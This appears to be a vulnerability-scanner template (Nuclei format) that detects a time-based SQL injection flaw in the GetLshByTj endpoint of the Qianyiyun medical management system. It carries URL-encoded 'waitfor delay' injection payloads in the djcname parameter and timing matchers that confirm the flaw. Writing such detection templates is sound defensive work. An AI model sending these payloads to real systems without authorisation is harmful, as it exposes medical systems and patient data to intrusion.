id: poc-qianyiyun-medical-management-system-sqli

info:
  name: "千一云医疗管理系统 GetLshByTj SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: Qianyiyun
  description: |
    Detects SQL Injection vulnerability in Qianyiyun Medical Management System's GetLshByTj endpoint.

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        GET /WebService.asmx/GetLshByTj HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "缺少参数"
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true

  - raw:
      - |
        GET /WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a5%27%2d%2d%20%2d&redonly=true&tjstr=12 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a8%27%2d%2d%20%2d&redonly=true&tjstr=12 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<html"
        part: body
        negative: true
      - type: word
        words:
          - "text/xml"
        part: header
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
